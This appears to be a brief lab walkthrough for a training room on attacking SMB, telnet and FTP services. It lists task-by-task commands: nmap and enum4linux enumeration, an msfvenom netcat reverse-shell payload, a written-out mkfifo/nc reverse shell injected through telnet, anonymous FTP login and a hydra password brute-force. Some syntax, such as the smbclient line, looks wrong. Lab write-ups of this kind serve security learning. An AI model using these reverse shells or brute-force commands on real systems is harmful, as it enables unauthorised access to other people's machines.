# Network Services

> Nashia Holloway | MAy 8th, 2020

## Task 3 Enumerate SMB

**1. How many ports are open?**

```
nmap -sC -sV $IP -oN initial.nmap
```

**2-6**

```
enum4linux -a $IP
```

## Task 4 Exploiting SMB

**1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?**

```
smbclient //10.10.10.2/secret -u suit -p 445
```

**8. What is the smb.txt flag?**

```
ssh -i id_rsa cactus@$IP
```

## Task 6 Enumerating Telnet

**1. How many ports are open?**

```
nmap -A -p- $IP -oN telnet.nmap
```

**7. Usernames?**

```
telnet $IP 8012
```

## Task 7 Exploiting Telnet

```
msfvenom -p cmd/unix/reverse_netcat lhost=tun0 lport=1234 R
```
```
.RUN mkfifo /tmp/jaiaia; nc tun0 4444 0</tmp/jaiaia | /bin/sh >/tmp/jaiaia 2>&1; rm /tmp/jaiaia
```

## Task 8 Enumerating FTP

```
ftp $IP
ftp> username: anonymous
ftp> password: <ENTER>
```
There's a file there that gives us a clue to a username.

## Task 9 Exploit FTP

```
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.63.248 ftp
```

